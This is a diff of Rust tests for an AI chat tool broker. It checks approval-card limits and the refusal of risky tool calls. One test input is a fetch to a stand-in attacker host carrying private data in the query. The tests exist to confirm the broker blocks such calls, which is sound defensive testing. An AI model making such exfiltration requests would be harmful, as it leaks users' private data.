@@ -122,6 +122,33 @@ async fn an_interactive_call_waits_for_the_users_approval_card() {
     assert_eq!(calls.load(Ordering::SeqCst), 1);
     broker.shutdown().await.unwrap();
 
+    // A reply already at its limit of cards cannot ask: the call is refused
+    // with no card, and the refusal points to Settings rather than to a
+    // decline the user never made.
+    let (capped, mut cards) = card_capture();
+    capped.approvals_shown.store(
+        crate::chat::progress::MAX_PROGRESS_APPROVALS,
+        Ordering::SeqCst,
+    );
+    let capped = Arc::new(capped);
+    let socket = tool_broker_endpoint(temporary.path().join("approval-cap.sock"));
+    let broker = start_tool_broker(
+        socket.clone(),
+        policy(true, true),
+        Arc::new(executor_for(&state, capped.clone())),
+    )
+    .await
+    .unwrap();
+    let refused = broker_request(&socket, broker.token(), "mcp.call", arguments.clone()).await;
+    assert_eq!(refused["error"]["code"], "needs_approval", "{refused}");
+    assert!(cards.try_recv().is_err(), "no card is shown");
+    assert_eq!(
+        capped.tool_refusals.lock().unwrap()[0].reason,
+        crate::domain::ChatToolRefusalReason::NeedsApproval
+    );
+    assert_eq!(calls.load(Ordering::SeqCst), 1);
+    broker.shutdown().await.unwrap();
+
     // Always is stored for this Loupist and tool: the next turn runs without a card.
     let (always, mut cards) = card_capture();
     let socket = tool_broker_endpoint(temporary.path().join("approval-3.sock"));
@@ -290,7 +317,7 @@ async fn custom_connection_broker_records_refusals_blocks_injection_and_captures
                 "web.fetch",
                 json!({"url":"https://attacker.example/?d=private"}),
             ),
-            ("native.authorize", json!({"name":"bash"})),
+            ("native.authorize", json!({"name":"bash","command":"ls"})),
             ("mcp.call", arguments),
         ] {
             let refused = broker_request(&socket, broker.token(), method, params).await;
